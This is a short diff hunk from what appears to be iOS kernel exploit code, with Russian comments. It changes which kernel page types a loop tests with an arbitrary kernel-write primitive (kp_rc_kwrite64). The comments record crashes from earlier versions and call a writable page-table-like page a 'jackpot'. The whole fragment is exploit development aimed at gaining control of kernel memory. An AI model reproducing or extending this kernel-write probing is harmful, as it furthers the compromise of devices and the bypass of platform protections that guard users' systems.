@@ -5401,12 +5401,12 @@ static BOOL kpHuntPtrOK(uint64_t v)
     }
     GNOTE( [NSString stringWithFormat:@"  heap/userland страниц: %u", nheap]);
 
-    // 3c. write-test ЧИТАЕМЫХ типов — ПЕРВЫМИ (порядок меняем: v10/v11
-    //     дохли в sample-фазе на read-fault 0x13/0x14, не дойдя до записи).
-    //     0x21 — контроль. Исключены: 0x0e (write-fault), 0x13/0x14
-    //     (read-fault), 0x06 (kernel text), 0x17/0x02 (таблицы).
+    // 3c. write-test — ТОЧЕЧНО: 0x21 (контроль), 0x11 (page-table-подобный,
+    //     phys|0x3 — джекпот если пишется), 0x09/0x18 (нули). 0x37 ИСКЛЮЧЁН:
+    //     запись туда = мгновенный EL2-ресет SoC без panic-лога (v12).
+    //     0x0e/0x06 (текст), 0x13/0x14 (read-fault), 0x17/0x02 — тоже нет.
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
-    static const uint8_t wtest[] = { 0x21, 0x37, 0x09, 0x11, 0x18 };
+    static const uint8_t wtest[] = { 0x21, 0x11, 0x09, 0x18 };
     for (int wi = 0; wi < (int)sizeof(wtest); wi++) {
         uint8_t t = wtest[wi];
         if (!typeCount[t]) continue;
